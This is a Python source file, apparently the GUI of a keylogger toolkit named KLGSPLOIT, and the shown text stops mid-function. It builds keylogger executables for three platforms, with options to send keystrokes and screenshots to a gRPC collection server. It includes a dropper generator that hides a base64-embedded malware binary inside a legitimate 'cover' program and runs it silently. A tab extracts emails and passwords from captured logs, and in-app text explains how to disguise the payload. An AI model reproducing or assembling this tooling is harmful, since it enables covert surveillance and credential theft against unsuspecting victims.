
"""
KLGSPLOIT GUI - Keylogger Toolkit with ttkbootstrap
Reuses CLI components and adds GUI + Executable Merging capability
"""

import sys
import os

# Add parent directory to path so we can import libs and klgsploit_cli
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import threading
import tempfile
import shutil
import re
import tkinter as tk
from tkinter import filedialog
from tkinter.scrolledtext import ScrolledText as TkScrolledText

# Import everything from CLI tool to reuse
from klgsploit_cli import (
    KlgMalware,
    get_platform,
    SCRIPT_WIN_STANDARD, SCRIPT_WIN_ADVANCED_TEMPLATE,
    SCRIPT_LNX_STANDARD, SCRIPT_LNX_ADVANCED_TEMPLATE,
    SCRIPT_MAC_STANDARD, SCRIPT_MAC_ADVANCED_TEMPLATE,
    loggerFunctionWindows, loggerFunctionLinux, loggerFunctionMac,
    global_screencapture, KeylogServer, send_key
)

# Try to import ttkbootstrap for better styling
try:
    from tkinter import ttk
    from tkinter import messagebox as Messagebox
    ScrolledText = TkScrolledText
    HAS_TTKBOOTSTRAP = False
    # Define constants for fallback
    X, Y, BOTH = tk.X, tk.Y, tk.BOTH
    LEFT, RIGHT, TOP, BOTTOM = tk.LEFT, tk.RIGHT, tk.TOP, tk.BOTTOM
    W, E, N, S = tk.W, tk.E, tk.N, tk.S
    NW, NE, SW, SE = tk.NW, tk.NE, tk.SW, tk.SE
    EW, NS, NSEW = tk.EW, tk.NS, tk.NSEW
    HORIZONTAL, VERTICAL = tk.HORIZONTAL, tk.VERTICAL
except ImportError:
    pass 
try:
    import PyInstaller.__main__ as pyinstaller
except ImportError:
    pyinstaller = None

# ============================================
# EXECUTABLE MERGER CLASS (NEW FEATURE)
# ============================================

class ExecutableMerger:
    """
    Merges two executables: a legitimate one (cover) and the malware payload.
    The merged executable runs both when launched.
    """
    
    def __init__(self):
        self.cover_exe = None
        self.malware_exe = None
        self.output_path = None
        self.output_name = "merged_payload"
        self.output_ext = "exe"
        self.icon_path = None
    
    def set_cover(self, path):
        """Set the legitimate executable to use as cover"""
        if os.path.exists(path):
            self.cover_exe = path
            return True
        return False
    
    def set_malware(self, path):
        """Set the malware executable to hide"""
        if os.path.exists(path):
            self.malware_exe = path
            return True
        return False
    
    def set_output(self, output_dir, filename, ext):
        """Set output parameters"""
        self.output_path = output_dir
        self.output_name = filename
        self.output_ext = ext
    
    def set_icon(self, icon_path):
        """Set custom icon for merged executable"""
        if icon_path and os.path.exists(icon_path):
            self.icon_path = icon_path
            return True
        return False
    
    def generate_dropper_script(self):
        """Generate a dropper script that extracts and runs both executables"""
        script = '''
import sys
import os
import subprocess
import tempfile
import base64
import threading

# Embedded executables (base64 encoded)
COVER_EXE_B64 = """{cover_b64}"""
MALWARE_EXE_B64 = """{malware_b64}"""

def extract_and_run():
    temp_dir = tempfile.mkdtemp(prefix="app_")
    
    # Extract cover executable
    cover_path = os.path.join(temp_dir, "app.exe")
    with open(cover_path, 'wb') as f:
        f.write(base64.b64decode(COVER_EXE_B64))
    
    # Extract malware (hidden)
    malware_path = os.path.join(temp_dir, ".runtime.exe")
    with open(malware_path, 'wb') as f:
        f.write(base64.b64decode(MALWARE_EXE_B64))
    
    # Run malware silently in background
    if sys.platform == 'win32':
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.Popen([malware_path], startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        subprocess.Popen([malware_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Run cover executable (visible to user)
    subprocess.Popen([cover_path])

if __name__ == "__main__":
    extract_and_run()
'''
        return script
    
    def merge(self, callback=None):
        """
        Merge the two executables into one.
        callback: function(status, message) for progress updates
        """
        def log(msg):
            if callback:
                callback("info", msg)
            print(f"[*] {msg}")
        
        def error(msg):
            if callback:
                callback("error", msg)
            print(f"[!] {msg}")
        
        if not self.cover_exe or not os.path.exists(self.cover_exe):
            error("Cover executable not set or doesn't exist")
            return False
        
        if not self.malware_exe or not os.path.exists(self.malware_exe):
            error("Malware executable not set or doesn't exist")
            return False
        
        if pyinstaller is None:
            error("PyInstaller not installed. Run: pip install pyinstaller")
            return False
        
        log("Reading cover executable...")
        with open(self.cover_exe, 'rb') as f:
            cover_data = f.read()
        
        log("Reading malware executable...")
        with open(self.malware_exe, 'rb') as f:
            malware_data = f.read()
        
        import base64
        cover_b64 = base64.b64encode(cover_data).decode('utf-8')
        malware_b64 = base64.b64encode(malware_data).decode('utf-8')
        
        log("Generating dropper script...")
        script = self.generate_dropper_script()
        script = script.replace('{cover_b64}', cover_b64)
        script = script.replace('{malware_b64}', malware_b64)
        
        # Write temp script
        temp_script = os.path.join(tempfile.gettempdir(), "merged_dropper.py")
        with open(temp_script, 'w') as f:
            f.write(script)
        
        log("Building merged executable with PyInstaller...")
        
        # Prepare output
        if not self.output_path:
            self.output_path = './dist'
        os.makedirs(self.output_path, exist_ok=True)
        
        pyinstaller_args = [
            '--onefile',
            '--noconsole',
            '--name', self.output_name,
            '--distpath', self.output_path,
            '--workpath', os.path.join(tempfile.gettempdir(), 'merge_build'),
            '--specpath', os.path.join(tempfile.gettempdir(), 'merge_spec'),
            '--clean',
            '--log-level=WARN',
        ]
        
        if self.icon_path and os.path.exists(self.icon_path):
            pyinstaller_args.extend(['--icon', self.icon_path])
        
        pyinstaller_args.append(temp_script)
        
        try:
            pyinstaller.run(pyinstaller_args)
            output_file = os.path.join(self.output_path, f"{self.output_name}.{self.output_ext}")
            log(f"Merged executable created: {output_file}")
            
            # Cleanup
            if os.path.exists(temp_script):
                os.remove(temp_script)
            
            if callback:
                callback("success", f"Merged executable created: {output_file}")
            return True
            
        except Exception as e:
            error(f"Build failed: {e}")
            return False


# ============================================
# GUI APPLICATION
# ============================================

class KlgsploitGUI:
    def __init__(self):
        # Create main window
        if HAS_TTKBOOTSTRAP:
            self.root = ttk.Window(
                title="KLGSPLOIT - Keylogger Toolkit",
                themename="darkly",
                size=(1000, 700),
                resizable=(True, True)
            )
        else:
            self.root = tk.Tk()
            self.root.title("KLGSPLOIT - Keylogger Toolkit")
            self.root.geometry("1000x700")
        
        self.platform = get_platform()
        self.server_thread = None
        self.keylogger_thread = None
        self.merger = ExecutableMerger()
        
        self.setup_ui()
    
    def setup_ui(self):
        """Setup the main UI with tabs"""
        # Header
        header_frame = ttk.Frame(self.root)
        header_frame.pack(fill=X, padx=10, pady=5)
        
        title = ttk.Label(
            header_frame,
            text="🔑 KLGSPLOIT",
            font=("Helvetica", 24, "bold"),
            bootstyle="danger" if HAS_TTKBOOTSTRAP else None
        )
        title.pack(side=LEFT)
        
        subtitle = ttk.Label(
            header_frame,
            text=f"  |  Platform: {self.platform.upper()}  |  by pengux8 & contributors",
            font=("Helvetica", 10)
        )
        subtitle.pack(side=LEFT, padx=10)
        
        # Notebook (Tabs)
        if HAS_TTKBOOTSTRAP:
            self.notebook = ttk.Notebook(self.root, bootstyle="dark")
        else:
            self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=BOTH, expand=True, padx=10, pady=5)
        
        # Tab 1: Build Standard
        self.tab_build = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_build, text="🔨 Build Standard")
        self.setup_build_tab()
        
        # Tab 2: Build Advanced
        self.tab_build_adv = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_build_adv, text="⚡ Build Advanced")
        self.setup_build_advanced_tab()
        
        # Tab 3: Merge Executables (NEW)
        self.tab_merge = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_merge, text="🔀 Merge EXE")
        self.setup_merge_tab()
        
        # Tab 4: Keylogger
        self.tab_keylog = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_keylog, text="⌨️ Keylogger")
        self.setup_keylogger_tab()
        
        # Tab 5: Server
        self.tab_server = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_server, text="🌐 gRPC Server")
        self.setup_server_tab()
        
        # Tab 6: Classify
        self.tab_classify = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_classify, text="🔍 Classify")
        self.setup_classify_tab()
        
        # Tab 7: Screenshot
        self.tab_screenshot = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_screenshot, text="📸 Screenshot")
        self.setup_screenshot_tab()
        
        # Tab 8: Log Viewer
        self.tab_logs = ttk.Frame(self.notebook)
        self.notebook.add(self.tab_logs, text="📋 Log Viewer")
        self.setup_log_viewer_tab()
        
        # Status Bar
        self.status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(
            self.root,
            textvariable=self.status_var,
            relief=tk.SUNKEN,
            anchor=W
        )
        status_bar.pack(fill=X, side=BOTTOM, padx=10, pady=5)
    
    # ============================================
    # TAB 1: BUILD STANDARD
    # ============================================
    def setup_build_tab(self):
        frame = ttk.Labelframe(self.tab_build, text="Build Standard Executable", padding=20)
        frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
        
        # Platform selection
        ttk.Label(frame, text="Target Platform:").grid(row=0, column=0, sticky=W, pady=5)
        self.build_platform = tk.StringVar(value="win")
        platform_combo = ttk.Combobox(frame, textvariable=self.build_platform, values=["win", "lnx", "mac"], width=30)
        platform_combo.grid(row=0, column=1, sticky=W, pady=5)
        
        # Output directory
        ttk.Label(frame, text="Output Directory:").grid(row=1, column=0, sticky=W, pady=5)
        self.build_output = tk.StringVar(value="./dist")
        ttk.Entry(frame, textvariable=self.build_output, width=40).grid(row=1, column=1, sticky=W, pady=5)
        ttk.Button(frame, text="Browse", command=lambda: self.browse_dir(self.build_output)).grid(row=1, column=2, padx=5)
        
        # Filename
        ttk.Label(frame, text="Filename:").grid(row=2, column=0, sticky=W, pady=5)
        self.build_filename = tk.StringVar(value="klgsploit_payload")
        ttk.Entry(frame, textvariable=self.build_filename, width=40).grid(row=2, column=1, sticky=W, pady=5)
        
        # Extension
        ttk.Label(frame, text="Extension:").grid(row=3, column=0, sticky=W, pady=5)
        self.build_ext = tk.StringVar(value="exe")
        ttk.Combobox(frame, textvariable=self.build_ext, values=["exe", "out", "app", "bin"], width=30).grid(row=3, column=1, sticky=W, pady=5)
        
        # Build button
        if HAS_TTKBOOTSTRAP:
            ttk.Button(frame, text="🔨 Build Standard Executable", bootstyle="success", command=self.do_build_standard).grid(row=4, column=0, columnspan=3, pady=20)
        else:
            ttk.Button(frame, text="Build Standard Executable", command=self.do_build_standard).grid(row=4, column=0, columnspan=3, pady=20)
        
        # Output log
        ttk.Label(frame, text="Build Output:").grid(row=5, column=0, sticky=NW, pady=5)
        self.build_log = ScrolledText(frame, height=10, width=70)
        self.build_log.grid(row=5, column=1, columnspan=2, sticky=NSEW, pady=5)
    
    def do_build_standard(self):
        platform = self.build_platform.get()
        output_dir = self.build_output.get()
        filename = self.build_filename.get()
        ext = self.build_ext.get()
        
        self.build_log.delete(1.0, tk.END)
        self.build_log.insert(tk.END, f"[*] Building standard executable for {platform}...\n")
        self.status_var.set("Building...")
        
        def build_thread():
            if platform == 'win':
                script = SCRIPT_WIN_STANDARD
            elif platform == 'lnx':
                script = SCRIPT_LNX_STANDARD
            elif platform == 'mac':
                script = SCRIPT_MAC_STANDARD
            else:
                self.build_log.insert(tk.END, f"[!] Unsupported platform: {platform}\n")
                return
            
            malware = KlgMalware(
                output_dir=output_dir,
                script=script,
                filename=filename,
                extention=ext,
                configs={},
                pltfrm=platform
            )
            
            result = malware.build_standard()
            
            if result:
                self.build_log.insert(tk.END, f"[+] Build successful: {output_dir}/{filename}.{ext}\n")
                self.status_var.set("Build completed successfully!")
            else:
                self.build_log.insert(tk.END, "[!] Build failed. Check PyInstaller installation.\n")
                self.status_var.set("Build failed!")
        
        threading.Thread(target=build_thread, daemon=True).start()
    
    # ============================================
    # TAB 2: BUILD ADVANCED
    # ============================================
    def setup_build_advanced_tab(self):
        frame = ttk.Labelframe(self.tab_build_adv, text="Build Advanced Executable (gRPC + Screenshots)", padding=20)
        frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
        
        # Platform
        ttk.Label(frame, text="Target Platform:").grid(row=0, column=0, sticky=W, pady=5)
        self.adv_platform = tk.StringVar(value="win")
        ttk.Combobox(frame, textvariable=self.adv_platform, values=["win", "lnx", "mac"], width=30).grid(row=0, column=1, sticky=W, pady=5)
        
        # Output
        ttk.Label(frame, text="Output Directory:").grid(row=1, column=0, sticky=W, pady=5)
        self.adv_output = tk.StringVar(value="./dist")
        ttk.Entry(frame, textvariable=self.adv_output, width=40).grid(row=1, column=1, sticky=W, pady=5)
        ttk.Button(frame, text="Browse", command=lambda: self.browse_dir(self.adv_output)).grid(row=1, column=2, padx=5)
        
        # Filename
        ttk.Label(frame, text="Filename:").grid(row=2, column=0, sticky=W, pady=5)
        self.adv_filename = tk.StringVar(value="klgsploit_advanced")
        ttk.Entry(frame, textvariable=self.adv_filename, width=40).grid(row=2, column=1, sticky=W, pady=5)
        
        # Extension
        ttk.Label(frame, text="Extension:").grid(row=3, column=0, sticky=W, pady=5)
        self.adv_ext = tk.StringVar(value="exe")
        ttk.Combobox(frame, textvariable=self.adv_ext, values=["exe", "out", "app", "bin"], width=30).grid(row=3, column=1, sticky=W, pady=5)
        
        # gRPC Host
        ttk.Label(frame, text="gRPC Server Host:").grid(row=4, column=0, sticky=W, pady=5)
        self.adv_host = tk.StringVar(value="localhost")
        ttk.Entry(frame, textvariable=self.adv_host, width=40).grid(row=4, column=1, sticky=W, pady=5)
        
        # gRPC Port
        ttk.Label(frame, text="gRPC Server Port:").grid(row=5, column=0, sticky=W, pady=5)
        self.adv_port = tk.StringVar(value="50051")
        ttk.Entry(frame, textvariable=self.adv_port, width=40).grid(row=5, column=1, sticky=W, pady=5)
        
        # Screenshot interval
        ttk.Label(frame, text="Screenshot Interval (sec):").grid(row=6, column=0, sticky=W, pady=5)
        self.adv_screenshot_interval = tk.StringVar(value="60")
        ttk.Entry(frame, textvariable=self.adv_screenshot_interval, width=40).grid(row=6, column=1, sticky=W, pady=5)
        
        # Build button
        if HAS_TTKBOOTSTRAP:
            ttk.Button(frame, text="⚡ Build Advanced Executable", bootstyle="warning", command=self.do_build_advanced).grid(row=7, column=0, columnspan=3, pady=20)
        else:
            ttk.Button(frame, text="Build Advanced Executable", command=self.do_build_advanced).grid(row=7, column=0, columnspan=3, pady=20)
        
        # Output log
        ttk.Label(frame, text="Build Output:").grid(row=8, column=0, sticky=NW, pady=5)
        self.adv_build_log = ScrolledText(frame, height=8, width=70)
        self.adv_build_log.grid(row=8, column=1, columnspan=2, sticky=NSEW, pady=5)
    
    def do_build_advanced(self):
        platform = self.adv_platform.get()
        output_dir = self.adv_output.get()
        filename = self.adv_filename.get()
        ext = self.adv_ext.get()
        host = self.adv_host.get()
        port = self.adv_port.get()
        screenshot_interval = int(self.adv_screenshot_interval.get())
        
        self.adv_build_log.delete(1.0, tk.END)
        self.adv_build_log.insert(tk.END, f"[*] Building advanced executable for {platform}...\n")
        self.adv_build_log.insert(tk.END, f"    gRPC: {host}:{port}\n")
        self.adv_build_log.insert(tk.END, f"    Screenshot interval: {screenshot_interval}s\n")
        self.status_var.set("Building advanced...")
        
        def build_thread():
            if platform == 'win':
                script = SCRIPT_WIN_ADVANCED_TEMPLATE.format(host=host, port=port, screenshot_interval=screenshot_interval)
            elif platform == 'lnx':
                script = SCRIPT_LNX_ADVANCED_TEMPLATE.format(host=host, port=port, screenshot_interval=screenshot_interval)
            elif platform == 'mac':
                script = SCRIPT_MAC_ADVANCED_TEMPLATE.format(host=host, port=port, screenshot_interval=screenshot_interval)
            else:
                self.adv_build_log.insert(tk.END, f"[!] Unsupported platform: {platform}\n")
                return
            
            malware = KlgMalware(
                output_dir=output_dir,
                script=script,
                filename=filename,
                extention=ext,
                configs={'host': host, 'port': port, 'screenshot_interval': screenshot_interval},
                pltfrm=platform
            )
            
            result = malware.build_advanced()
            
            if result:
                self.adv_build_log.insert(tk.END, f"[+] Build successful: {output_dir}/{filename}.{ext}\n")
                self.status_var.set("Advanced build completed!")
            else:
                self.adv_build_log.insert(tk.END, "[!] Build failed.\n")
                self.status_var.set("Build failed!")
        
        threading.Thread(target=build_thread, daemon=True).start()
    
    # ============================================
    # TAB 3: MERGE EXECUTABLES (NEW FEATURE)
    # ============================================
    def setup_merge_tab(self):
        frame = ttk.Labelframe(self.tab_merge, text="Merge Executables (Hide Malware in Legitimate App)", padding=20)
        frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
        
        # Cover executable
        ttk.Label(frame, text="Cover Executable (Legitimate):").grid(row=0, column=0, sticky=W, pady=5)
        self.merge_cover = tk.StringVar()
        ttk.Entry(frame, textvariable=self.merge_cover, width=50).grid(row=0, column=1, sticky=W, pady=5)
        ttk.Button(frame, text="Browse", command=lambda: self.browse_file(self.merge_cover, [("Executables", "*.exe *.out *.app *.bin"), ("All files", "*.*")])).grid(row=0, column=2, padx=5)
        
        # Malware executable
        ttk.Label(frame, text="Malware Executable (Hidden):").grid(row=1, column=0, sticky=W, pady=5)
        self.merge_malware = tk.StringVar()
        ttk.Entry(frame, textvariable=self.merge_malware, width=50).grid(row=1, column=1, sticky=W, pady=5)
        ttk.Button(frame, text="Browse", command=lambda: self.browse_file(self.merge_malware, [("Executables", "*.exe *.out *.app *.bin"), ("All files", "*.*")])).grid(row=1, column=2, padx=5)
        
        # Icon (optional)
        ttk.Label(frame, text="Custom Icon (Optional):").grid(row=2, column=0, sticky=W, pady=5)
        self.merge_icon = tk.StringVar()
        ttk.Entry(frame, textvariable=self.merge_icon, width=50).grid(row=2, column=1, sticky=W, pady=5)
        ttk.Button(frame, text="Browse", command=lambda: self.browse_file(self.merge_icon, [("Icons", "*.ico"), ("All files", "*.*")])).grid(row=2, column=2, padx=5)
        
        ttk.Separator(frame, orient=HORIZONTAL).grid(row=3, column=0, columnspan=3, sticky=EW, pady=10)
        
        # Output settings
        ttk.Label(frame, text="Output Directory:").grid(row=4, column=0, sticky=W, pady=5)
        self.merge_output = tk.StringVar(value="./dist/merged")
        ttk.Entry(frame, textvariable=self.merge_output, width=50).grid(row=4, column=1, sticky=W, pady=5)
        ttk.Button(frame, text="Browse", command=lambda: self.browse_dir(self.merge_output)).grid(row=4, column=2, padx=5)
        
        ttk.Label(frame, text="Output Filename:").grid(row=5, column=0, sticky=W, pady=5)
        self.merge_filename = tk.StringVar(value="merged_app")
        ttk.Entry(frame, textvariable=self.merge_filename, width=50).grid(row=5, column=1, sticky=W, pady=5)
        
        ttk.Label(frame, text="Extension:").grid(row=6, column=0, sticky=W, pady=5)
        self.merge_ext = tk.StringVar(value="exe")
        ttk.Combobox(frame, textvariable=self.merge_ext, values=["exe", "out", "app", "bin"], width=48).grid(row=6, column=1, sticky=W, pady=5)
        
        # Merge button
        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=7, column=0, columnspan=3, pady=20)
        
        if HAS_TTKBOOTSTRAP:
            ttk.Button(btn_frame, text="🔀 Merge Executables", bootstyle="danger", command=self.do_merge).pack(side=LEFT, padx=10)
            ttk.Button(btn_frame, text="📂 Build Malware First", bootstyle="info", command=lambda: self.notebook.select(0)).pack(side=LEFT, padx=10)
        else:
            ttk.Button(btn_frame, text="Merge Executables", command=self.do_merge).pack(side=LEFT, padx=10)
            ttk.Button(btn_frame, text="Build Malware First", command=lambda: self.notebook.select(0)).pack(side=LEFT, padx=10)
        
        # Info label
        info_text = """
How it works:
1. First, build your malware executable using 'Build Standard' or 'Build Advanced' tab
2. Select a legitimate executable (e.g., game, utility, installer) as the "Cover"
3. Select your malware executable as "Malware"
4. Click "Merge Executables"

The merged executable will:
- Show the legitimate app to the user
- Silently run the malware in the background
        """
        ttk.Label(frame, text=info_text, justify=LEFT, wraplength=600).grid(row=8, column=0, columnspan=3, sticky=W, pady=10)
        
        # Merge log
        ttk.Label(frame, text="Merge Output:").grid(row=9, column=0, sticky=NW, pady=5)
        self.merge_log = ScrolledText(frame, height=6, width=70)
        self.merge_log.grid(row=9, column=1, columnspan=2, sticky=NSEW, pady=5)
    
    def do_merge(self):
        cover = self.merge_cover.get()
        malware = self.merge_malware.get()
        icon = self.merge_icon.get()
        output_dir = self.merge_output.get()
        filename = self.merge_filename.get()
        ext = self.merge_ext.get()
        
        self.merge_log.delete(1.0, tk.END)
        
        if not cover or not os.path.exists(cover):
            self.merge_log.insert(tk.END, "[!] Please select a valid cover executable\n")
            return
        
        if not malware or not os.path.exists(malware):
            self.merge_log.insert(tk.END, "[!] Please select a valid malware executable\n")
            return
        
        self.merge_log.insert(tk.END, "[*] Starting merge process...\n")
        self.status_var.set("Merging executables...")
        
        def merge_callback(status, message):
            self.merge_log.insert(tk.END, f"[{status}] {message}\n")
            self.merge_log.see(tk.END)
        
        def merge_thread():
            merger = ExecutableMerger()
            merger.set_cover(cover)
            merger.set_malware(malware)
            merger.set_output(output_dir, filename, ext)
            if icon:
                merger.set_icon(icon)
            
            result = merger.merge(callback=merge_callback)
            
            if result:
                self.status_var.set("Merge completed successfully!")
            else:
                self.status_var.set("Merge failed!")
        
        threading.Thread(target=merge_thread, daemon=True).start()
    
    # ============================================
    # TAB 4: KEYLOGGER
    # ============================================
    def setup_keylogger_tab(self):
        frame = ttk.Labelframe(self.tab_keylog, text="Local Keylogger", padding=20)
        frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
        
        ttk.Label(frame, text=f"Current Platform: {self.platform.upper()}", font=("Helvetica", 12)).pack(pady=10)
        
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(pady=10)
        
        if HAS_TTKBOOTSTRAP:
            ttk.Button(btn_frame, text="▶️ Start Keylogger", bootstyle="success", command=self.start_keylogger).pack(side=LEFT, padx=10)
            ttk.Button(btn_frame, text="⏹️ Stop Keylogger", bootstyle="danger", command=self.stop_keylogger).pack(side=LEFT, padx=10)
        else:
            ttk.Button(btn_frame, text="Start Keylogger", command=self.start_keylogger).pack(side=LEFT, padx=10)
            ttk.Button(btn_frame, text="Stop Keylogger", command=self.stop_keylogger).pack(side=LEFT, padx=10)
        
        ttk.Label(frame, text="Keylog Output:").pack(anchor=W, pady=(20, 5))
        self.keylog_output = ScrolledText(frame, height=15, width=80)
        self.keylog_output.pack(fill=BOTH, expand=True)
        
        self.keylogger_running = False
    
    def start_keylogger(self):
        if self.keylogger_running:
            return
        
        self.keylogger_running = True
        self.keylog_output.delete(1.0, tk.END)
        self.keylog_output.insert(tk.END, f"[*] Starting keylogger on {self.platform}...\n")
        self.status_var.set("Keylogger running...")
        
        def keylog_action(key_str, key_type, window, timestamp):
            self.keylog_output.insert(tk.END, f"[{timestamp}] {key_str} ({key_type}) - {window}\n")
            self.keylog_output.see(tk.END)
        
        def run_keylogger():
            try:
                if self.platform == 'win':
                    loggerFunctionWindows(action=keylog_action)
                elif self.platform == 'lnx':
                    loggerFunctionLinux(action=keylog_action)
                elif self.platform == 'mac':
                    loggerFunctionMac(action=keylog_action)
            except Exception as e:
                self.keylog_output.insert(tk.END, f"[!] Error: {e}\n")
        
        self.keylogger_thread = threading.Thread(target=run_keylogger, daemon=True)
        self.keylogger_thread.start()
    
    def stop_keylogger(self):
        self.keylogger_running = False
        self.keylog_output.insert(tk.END, "[*] Keylogger stopped.\n")
        self.status_var.set("Keylogger stopped")
    
    # ============================================
    # TAB 5: gRPC SERVER
    # ============================================
    def setup_server_tab(self):
        frame = ttk.Labelframe(self.tab_server, text="gRPC Keylog Server", padding=20)
        frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
        
        # Host/Port config
        config_frame = ttk.Frame(frame)
        config_frame.pack(pady=10)
        
        ttk.Label(config_frame, text="Host:").pack(side=LEFT, padx=5)
        self.server_host = tk.StringVar(value="0.0.0.0")
        ttk.Entry(config_frame, textvariable=self.server_host, width=20).pack(side=LEFT, padx=5)
        
        ttk.Label(config_frame, text="Port:").pack(side=LEFT, padx=5)
        self.server_port = tk.StringVar(value="50051")
        ttk.Entry(config_frame, textvariable=self.server_port, width=10).pack(side=LEFT, padx=5)
        
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(pady=10)
        
        if HAS_TTKBOOTSTRAP:
            ttk.Button(btn_frame, text="🌐 Start Server", bootstyle="success", command=self.start_server).pack(side=LEFT, padx=10)
            ttk.Button(btn_frame, text="⏹️ Stop Server", bootstyle="danger", command=self.stop_server).pack(side=LEFT, padx=10)
        else:
            ttk.Button(btn_frame, text="Start Server", command=self.start_server).pack(side=LEFT, padx=10)
            ttk.Button(btn_frame, text="Stop Server", command=self.stop_server).pack(side=LEFT, padx=10)
        
        ttk.Label(frame, text="Server Log:").pack(anchor=W, pady=(20, 5))
        self.server_log = ScrolledText(frame, height=15, width=80)
        self.server_log.pack(fill=BOTH, expand=True)
    
    def start_server(self):
        host = self.server_host.get()
        port = int(self.server_port.get())
        
        self.server_log.delete(1.0, tk.END)
        self.server_log.insert(tk.END, f"[*] Starting gRPC server on {host}:{port}...\n")
        self.status_var.set(f"Server running on {host}:{port}")
        
        def run_server():
            try:
                server = KeylogServer()
                server.serve(host=host, port=port)
            except Exception as e:
                self.server_log.insert(tk.END, f"[!] Server error: {e}\n")
        
        self.server_thread = threading.Thread(target=run_server, daemon=True)
        self.server_thread.start()
        self.server_log.insert(tk.END, "[+] Server started.\n")
    
    def stop_server(self):
        self.server_log.insert(tk.END, "[*] Server stop requested (restart app to fully stop).\n")
        self.status_var.set("Server stopped")
    
    # ============================================
    # TAB 6: CLASSIFY
    # ============================================
    def setup_classify_tab(self):
        frame = ttk.Labelframe(self.tab_classify, text="Classify Log File (Extract Emails/Passwords)", padding=20)
        frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
        
        # Input file
        input_frame = ttk.Frame(frame)
        input_frame.pack(fill=X, pady=10)
        
        ttk.Label(input_frame, text="Log File:").pack(side=LEFT, padx=5)
        self.classify_input = tk.StringVar()
        ttk.Entry(input_frame, textvariable=self.classify_input, width=50).pack(side=LEFT, padx=5)
        ttk.Button(input_frame, text="Browse", command=lambda: self.browse_file(self.classify_input, [("Log files", "*.txt *.log"), ("All files", "*.*")])).pack(side=LEFT, padx=5)
        
        if HAS_TTKBOOTSTRAP:
            ttk.Button(frame, text="🔍 Classify", bootstyle="info", command=self.do_classify).pack(pady=10)
        else:
            ttk.Button(frame, text="Classify", command=self.do_classify).pack(pady=10)
        
        # Results
        results_frame = ttk.Frame(frame)
        results_frame.pack(fill=BOTH, expand=True, pady=10)
        
        # Emails
        ttk.Label(results_frame, text="Emails Found:").pack(anchor=W)
        self.classify_emails = ScrolledText(results_frame, height=8, width=80)
        self.classify_emails.pack(fill=X, pady=5)
        
        # Passwords
        ttk.Label(results_frame, text="Potential Passwords:").pack(anchor=W)
        self.classify_passwords = ScrolledText(results_frame, height=8, width=80)
        self.classify_passwords.pack(fill=X, pady=5)
    
    def do_classify(self):
        input_file = self.classify_input.get()
        
        if not input_file or not os.path.exists(input_file):
            if HAS_TTKBOOTSTRAP:
                Messagebox.show_error("Please select a valid log file", "Error")
            else:
                Messagebox.showerror("Error", "Please select a valid log file")
            return
        
        self.classify_emails.delete(1.0, tk.END)
        self.classify_passwords.delete(1.0, tk.END)
        
        # Email regex
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        # Password patterns
        password_patterns = [
            r'(?:password|passwd|pwd|pass)[:\s=]+([^\s\n]+)',
            r'(?:mot de passe|mdp)[:\s=]+([^\s\n]+)',
        ]
        
        try:
            with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Find emails
            emails = set(re.findall(email_pattern, content, re.IGNORECASE))
            for email in emails:
                self.classify_emails.insert(tk.END, f"{email}\n")
            
            if not emails:
                self.classify_emails.insert(tk.END, "No emails found.\n")
            
            # Find passwords
            passwords = set()
            for pattern in password_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                passwords.update(matches)
            
            for pwd in passwords:
                self.classify_passwords.insert(tk.END, f"{pwd}\n")
            
            if not passwords:
                self.classify_passwords.insert(tk.END, "No passwords found.\n")
            
            self.status_var.set(f"Classified: {len(emails)} emails, {len(passwords)} passwords")
            
        except Exception as e:
            if HAS_TTKBOOTSTRAP:
                Messagebox.show_error(f"Error reading file: {e}", "Error")
            else:
                Messagebox.showerror("Error", f"Error reading file: {e}")
    
    # ============================================
    # TAB 7: SCREENSHOT
    # ============================================
    def setup_screenshot_tab(self):
        frame = ttk.Labelframe(self.tab_screenshot, text="Take Screenshot", padding=20)
        frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
        
        # Output directory
        ttk.Label(frame, text="Output Directory:").grid(row=0, column=0, sticky=W, pady=5)
        self.screenshot_output = tk.StringVar(value="./screenshots")
        ttk.Entry(frame, textvariable=self.screenshot_output, width=40).grid(row=0, column=1, sticky=W, pady=5)
        ttk.Button(frame, text="Browse", command=lambda: self.browse_dir(self.screenshot_output)).grid(row=0, column=2, padx=5)
        
        # Filename
        ttk.Label(frame, text="Filename:").grid(row=1, column=0, sticky=W, pady=5)
        self.screenshot_filename = tk.StringVar(value="screenshot")
        ttk.Entry(frame, textvariable=self.screenshot_filename, width=40).grid(row=1, column=1, sticky=W, pady=5)
        
        if HAS_TTKBOOTSTRAP:
            ttk.Button(frame, text="📸 Take Screenshot", bootstyle="primary", command=self.do_screenshot).grid(row=2, column=0, columnspan=3, pady=20)
        else:
            ttk.Button(frame, text="Take Screenshot", command=self.do_screenshot).grid(row=2, column=0, columnspan=3, pady=20)
        
        self.screenshot_status = tk.StringVar(value="")
        ttk.Label(frame, textvariable=self.screenshot_status).grid(row=3, column=0, columnspan=3)
    
    def do_screenshot(self):
